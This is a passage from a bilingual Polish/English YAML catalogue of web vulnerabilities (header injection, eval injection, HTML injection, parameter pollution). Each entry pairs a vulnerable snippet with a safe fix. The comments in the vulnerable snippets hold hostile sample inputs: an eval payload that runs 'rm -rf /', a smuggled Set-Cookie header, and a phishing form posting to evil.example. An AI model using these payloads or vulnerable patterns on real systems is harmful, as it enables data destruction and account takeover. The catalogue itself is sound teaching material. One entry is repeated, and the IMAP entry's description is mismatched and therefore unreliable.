  confidence: POSSIBLE
  cwe:
  - CWE-93
  - CWE-113
  desc: 'Niezfiltrowane znaki CR/LF (\r\n) w nagłówkach HTTP/SMTP pozwalają wstrzyknąć dodatkowe nagłówki lub rozdzielić odpowiedź.

    '
  desc_en: Unfiltered CR/LF (\r\n) characters in HTTP/SMTP headers allow injection of additional headers or response splitting.
  lang: python
  vuln: "# PODATNE — surowy input do nagłówka\nfrom flask import request, Response\n@app.route('/r')\ndef r():\n    url = request.args.get('url')\n    resp = Response('', 302)\n    resp.headers['Location'] = url  # url=\"x\\r\\nSet-Cookie: admin=1\"\n    return resp\n"
  safe: "# BEZPIECZNE — walidacja + odrzucenie CR/LF\nfrom flask import request, abort, redirect\n@app.route('/r')\ndef r():\n    url = request.args.get('url', '')\n    if '\\r' in url or '\\n' in url:\n        abort(400)\n    return redirect(url)  # framework dodatkowo sanitizuje\n"
- id: '1.23'
  name: Eval Injection
  severity: Critical
  difficulty: Easy
  confidence: POSSIBLE
  cwe:
  - CWE-94
  - CWE-95
  desc: 'Nieufny input przekazany do eval/exec jest wykonywany jako kod aplikacji.

    '
  desc_en: Untrusted input passed to eval/exec is executed as application code.
  lang: python
  vuln: "def calc(expr):\n    return eval(expr)  # expr=\"__import__('os').system('rm -rf /')\"\n"
  safe: "import ast, operator as op\nOPS={ast.Add:op.add, ast.Sub:op.sub, ast.Mult:op.mul, ast.Div:op.truediv}\ndef calc(expr):\n    def ev(n):\n        if isinstance(n, ast.Constant): return n.value\n        if isinstance(n, ast.BinOp): return OPS[type(n.op)](ev(n.left), ev(n.right))\n        raise ValueError('niedozwolone')\n    return ev(ast.parse(expr, mode='eval').body)\n"
- id: '1.24'
  name: HTML Injection
  severity: High
  difficulty: Easy
  confidence: POSSIBLE
  cwe:
  - CWE-79
  - CWE-451
  desc: 'Nieoczyszczony input wstawiony do HTML pozwala wstrzyknąć znaczniki (formularz phishingowy, przekierowanie meta-refresh, eksfiltracja przez CSS) nawet bez wykonania jakiegokolwiek skryptu.

    '
  desc_en: Unsanitized input inserted into HTML allows tag injection (a phishing form, a meta-refresh redirect, CSS-based exfiltration) even without any script executing.
  lang: javascript
  vuln: 'el.innerHTML = "Witaj " + userName; // userName=''<form action=//evil.example>''

    '
  safe: 'el.textContent = "Witaj " + userName; // brak interpretacji HTML

    '
- id: '1.25'
  name: HTTP Header Injection
  severity: High
  difficulty: Medium
  confidence: POSSIBLE
  cwe:
  - CWE-93
  - CWE-113
  desc: 'Niezfiltrowane znaki CR/LF (\r\n) w nagłówkach HTTP/SMTP pozwalają wstrzyknąć dodatkowe nagłówki lub rozdzielić odpowiedź.

    '
  desc_en: Unfiltered CR/LF (\r\n) characters in HTTP/SMTP headers allow injection of additional headers or response splitting.
  lang: python
  vuln: "# PODATNE — surowy input do nagłówka\nfrom flask import request, Response\n@app.route('/r')\ndef r():\n    url = request.args.get('url')\n    resp = Response('', 302)\n    resp.headers['Location'] = url  # url=\"x\\r\\nSet-Cookie: admin=1\"\n    return resp\n"
  safe: "# BEZPIECZNE — walidacja + odrzucenie CR/LF\nfrom flask import request, abort, redirect\n@app.route('/r')\ndef r():\n    url = request.args.get('url', '')\n    if '\\r' in url or '\\n' in url:\n        abort(400)\n    return redirect(url)  # framework dodatkowo sanitizuje\n"
- id: '1.26'
  name: HTTP Parameter Pollution
  severity: Medium
  difficulty: Medium
  confidence: POSSIBLE
  cwe:
  - CWE-235
  desc: 'Zduplikowane parametry są różnie interpretowane przez warstwy aplikacji, co pozwala obejść walidację/WAF.

    '
  desc_en: Duplicated parameters are interpreted differently by application layers, allowing validation or WAF bypass.
  lang: javascript
  vuln: '// ?role=user&role=admin — bierze ostatni

    const role = req.query.role; // może być tablicą lub admin

    '
  safe: 'const raw = req.query.role;

    const role = Array.isArray(raw) ? raw[0] : raw;

    if (![''user''].includes(role)) return res.sendStatus(400);

    '
- id: '1.27'
  name: IMAP Injection
  severity: Critical
  difficulty: Easy
  confidence: POSSIBLE
  cwe:
  - CWE-78
  desc: 'Nieufny input trafia do polecenia powłoki — atakujący wykonuje dowolne komendy.

    '
